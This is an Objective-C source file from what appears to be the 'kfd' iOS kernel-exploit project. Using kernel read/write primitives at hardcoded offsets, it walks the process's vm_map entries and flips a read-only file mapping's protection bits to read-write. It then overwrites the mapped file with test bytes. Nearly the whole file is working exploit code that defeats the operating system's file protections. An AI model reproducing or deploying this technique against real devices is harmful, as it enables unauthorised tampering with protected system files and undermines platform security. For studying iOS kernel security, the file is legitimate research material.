//
//  thanks_opa334dev_htrowii.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/30.
//

#import <Foundation/Foundation.h>
#import <sys/mman.h>
#import <UIKit/UIKit.h>
#import "krw.h"
#import "proc.h"

#define FLAGS_PROT_SHIFT    7
#define FLAGS_MAXPROT_SHIFT 11
//#define FLAGS_PROT_MASK     0xF << FLAGS_PROT_SHIFT
//#define FLAGS_MAXPROT_MASK  0xF << FLAGS_MAXPROT_SHIFT
#define FLAGS_PROT_MASK    0x780
#define FLAGS_MAXPROT_MASK 0x7800

uint64_t getTask(void) {
    uint64_t proc = getProc(getpid());
    uint64_t proc_ro = kread64(proc + 0x18);
    uint64_t pr_task = kread64(proc_ro + 0x8);
    printf("[i] self proc->proc_ro->pr_task: 0x%llx\n", pr_task);
    return pr_task;
}

uint64_t kread_ptr(uint64_t kaddr) {
    uint64_t ptr = kread64(kaddr);
    if ((ptr >> 55) & 1) {
        return ptr | 0xFFFFFF8000000000;
    }

    return ptr;
}

void kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
    uint32_t outputOffset = 0;
    unsigned char* outputBytes = (unsigned char*)output;
    
    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
    {
        uint32_t k = kread32(curAddr);

        unsigned char* kb = (unsigned char*)&k;
        for(int i = 0; i < 4; i++)
        {
            if(outputOffset == size) break;
            outputBytes[outputOffset] = kb[i];
            outputOffset++;
        }
        if(outputOffset == size) break;
    }
}

uint64_t vm_map_get_header(uint64_t vm_map_ptr)
{
    return vm_map_ptr + 0x10;
}

uint64_t vm_map_header_get_first_entry(uint64_t vm_header_ptr)
{
    return kread_ptr(vm_header_ptr + 0x8);
}

uint64_t vm_map_entry_get_next_entry(uint64_t vm_entry_ptr)
{
    return kread_ptr(vm_entry_ptr + 0x8);
}


uint32_t vm_header_get_nentries(uint64_t vm_header_ptr)
{
    return kread32(vm_header_ptr + 0x20);
}

void vm_entry_get_range(uint64_t vm_entry_ptr, uint64_t *start_address_out, uint64_t *end_address_out)
{
    uint64_t range[2];
    kreadbuf(vm_entry_ptr + 0x10, &range[0], sizeof(range));
    if (start_address_out) *start_address_out = range[0];
    if (end_address_out) *end_address_out = range[1];
}


//void vm_map_iterate_entries(uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
void vm_map_iterate_entries(uint64_t vm_map_ptr, void (^itBlock)(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop))
{
    uint64_t header = vm_map_get_header(vm_map_ptr);
    uint64_t entry = vm_map_header_get_first_entry(header);
    uint64_t numEntries = vm_header_get_nentries(header);

    while (entry != 0 && numEntries > 0) {
        uint64_t start = 0, end = 0;
        vm_entry_get_range(entry, &start, &end);

        BOOL stop = NO;
        itBlock(start, end, entry, &stop);
        if (stop) break;

        entry = vm_map_entry_get_next_entry(entry);
        numEntries--;
    }
}

uint64_t vm_map_find_entry(uint64_t vm_map_ptr, uint64_t address)
{
    __block uint64_t found_entry = 0;
        vm_map_iterate_entries(vm_map_ptr, ^(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop) {
            if (address >= start && address < end) {
                found_entry = entry;
                *stop = YES;
            }
        });
        return found_entry;
}

void vm_map_entry_set_prot(uint64_t entry_ptr, vm_prot_t prot, vm_prot_t max_prot)
{
    uint64_t flags = kread64(entry_ptr + 0x48);
    uint64_t new_flags = flags;
    new_flags = (new_flags & ~FLAGS_PROT_MASK) | ((uint64_t)prot << FLAGS_PROT_SHIFT);
    new_flags = (new_flags & ~FLAGS_MAXPROT_MASK) | ((uint64_t)max_prot << FLAGS_MAXPROT_SHIFT);
    if (new_flags != flags) {
        kwrite64(entry_ptr + 0x48, new_flags);
    }
}

uint64_t start = 0, end = 0;

uint64_t task_get_vm_map(uint64_t task_ptr)
{
    return kread_ptr(task_ptr + 0x28);
}
#pragma mark overwrite2
uint64_t funVnodeOverwrite2(char* tofile, char* fromfile) {
    printf("attempting opa's method\n");
    int to_fd = open(tofile, O_RDONLY);
    if (to_fd < 0) {
        return 0;
    }

    // Get the size of the source file
    off_t to_file_size = lseek(to_fd, 0, SEEK_END);
    if (to_file_size <= 0) {
        close(to_fd);
        return 0;
    }

    //mmap as read only
    printf("mmap as readonly\n");
    char* to_file_data = mmap(NULL, to_file_size, PROT_READ, MAP_SHARED, to_fd, 0);
    if (to_file_data == MAP_FAILED) {
        close(to_fd);
        // Handle error mapping source file
        return 0;
    }
    
    // set prot to re-
    printf("task_get_vm_map -> vm ptr\n");
    uint64_t vm_ptr = task_get_vm_map(getTask());
    uint64_t entry_ptr = vm_map_find_entry(vm_ptr, (uint64_t)to_file_data);
    printf("set prot to rw-\n");
    vm_map_entry_set_prot(entry_ptr, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);
    
//    // Open the destination file for writing
//    int to_fd = open(tofile, O_RDWR);
//    if (to_fd < 0) {
//        // Handle error opening destination file
//        munmap(from_file_data, from_file_size);
//        close(from_fd);
//        return 0;
//    }
//
//    // Get the size of the destination file
//    off_t to_file_size = lseek(to_fd, 0, SEEK_END);
//    if (to_file_size <= 0) {
//        close(to_fd);
//        munmap(from_file_data, from_file_size);
//        close(from_fd);
//        // Handle error getting destination file size
//        return 0;
//    }
//
//    }
    
    // WRITE
    const char* data = "AAAAAAAAAAAAAAAAAAAAAAA";
    
    size_t data_len = strlen(data);
    off_t file_size = lseek(to_fd, 0, SEEK_END);
    if (file_size == -1) {
        perror("Failed lseek.");
    }
    
    char* mapped = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, to_fd, 0);
    if (mapped == MAP_FAILED) {
        printf("Failed mapped here...\n");
    }
    printf("Is it writable???\n");
    memcpy(to_file_data, data, data_len);
//    memcpy(mapped, data, data_len);
    
    printf("done???????");
    // Cleanup
    munmap(to_file_data, to_file_size);
    close(to_fd);
//    munmap(from_file_data, from_file_size);
//    close(from_fd);

    // Return success or error code
    return 0;
}
